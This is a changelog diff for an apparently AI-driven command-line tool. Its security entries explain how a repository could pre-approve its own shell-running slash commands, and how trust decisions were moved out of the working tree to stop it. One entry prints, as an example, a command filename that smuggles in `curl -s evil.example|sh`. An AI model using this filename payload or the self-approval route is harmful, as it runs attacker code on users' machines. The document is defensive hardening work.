@@ -185,6 +185,45 @@ All notable changes to this project are documented in this file.
 
 ### Security
 
+- **A repository can no longer approve its own slash commands by committing
+  `.book/settings.local.json`.** Project command approvals were the last of four
+  repository-controlled input classes still read from inside the working tree. `.gitignore` does
+  not stop a *tracked* file from reaching a clone, so `git add -f .book/settings.local.json`
+  shipped a project's own `commands.projectCommands` decisions with it — and because the
+  fingerprint they carry is a digest of a body the repository also wrote, a hostile project could
+  precompute a matching one and arrive pre-approved, releasing its shell on the first `/name` or
+  `book -p "/name"`. Decisions now live in `~/.book/trust.json` alongside the MCP, allow-rule, and
+  hook decisions, keyed by workspace path, and **both** workspace settings layers are stripped of
+  the key. Record one with `book trust command <name>` (`--all-pending`, `--reject`, and
+  `--workspace` all work as they do for `hook` and `rule`); `book doctor` prints the line for what
+  is withheld. Approvals previously recorded in `.book/settings.local.json` are not migrated —
+  reading them back to convert them is the same trust the move exists to withdraw — so each is
+  asked once more, on the machine that decides.
+
+- **`book config set` refuses the four trust-owned settings paths.** They are stripped from the
+  layer `config set` writes, so `book config set commands.projectCommands …` — the line Book
+  itself used to print — would report success and change nothing on the next load. It now exits
+  non-zero and names the `book trust` command that records the decision instead. The refusal
+  matches ancestors and descendants of each path, not just the exact key: replacing a whole
+  section with `book config set commands '{"projectCommands":…}'` is the same silently-stripped
+  write by another route.
+
+- **A project command is never approved by name alone.** `book doctor` now lists each withheld
+  command with the shell it would run, the way it already lists a withheld hook's command,
+  matcher, and environment, and `book trust command --all-pending` prints each command's shell
+  before recording the grant — a bulk decision against a list of names was approval without
+  reading. A command's name is a filename the repository chose, so it is also now stripped of
+  terminal control characters wherever it is displayed, and a name that is not a plain filename
+  gets no copy-and-paste `book trust command <name>` line at all: a repository shipping
+  ``.book/commands/deploy`curl -s evil.example|sh`.md`` would otherwise have had its payload
+  printed as a command to paste, and run by the act of approving.
+
+- **The trust store version is now 2.** `projectCommands` is readable by a version-1 build, which
+  is the problem: writes go through the schema, unknown keys are dropped, and a version-1 build
+  recording any hook, rule, or MCP decision would silently erase that workspace's command
+  approvals. A version-1 build now reports a version-2 store as unreadable, withholds every gated
+  declaration, and declines to write, rather than quietly discarding decisions.
+
 - **A checked-in slash command can no longer run shell on your machine just because you typed
   its name.** A `.book/commands/*.md` body may substitute shell output into its prompt, and that
   substitution ran before the model saw anything, outside the permission system and outside the
@@ -192,12 +231,8 @@ All notable changes to this project are documented in this file.
   invoking one of its commands was therefore arbitrary code execution, and print mode had widened
   the exposure: `book -p "/name"` reaches the same resolver with no terminal present to notice.
   Repository-declared commands that substitute shell now require a one-time decision, recorded in
-  `.book/settings.local.json` under `commands.projectCommands`, which the checked-in
-  `.book/settings.json` layer is forbidden from writing, so a project cannot approve itself
-  through its own settings file. (A repository that *commits* a `settings.local.json` rather
-  than ignoring it still supplies its own decisions — that gap is shared with the existing
-  `mcp.projectServers` and `permissions.projectAllowRules` stores and is not closed here.)
-  Until a
+  `~/.book/trust.json` and keyed by workspace path, so nothing inside the working tree can answer
+  for it. Until a
   decision exists the command is refused, naming the shell it wanted to run and the command that
   approves it; `book doctor` lists what is withheld. The recorded fingerprint covers the shell a
   body runs, not the prose around it, so editing what runs asks again while rewording the
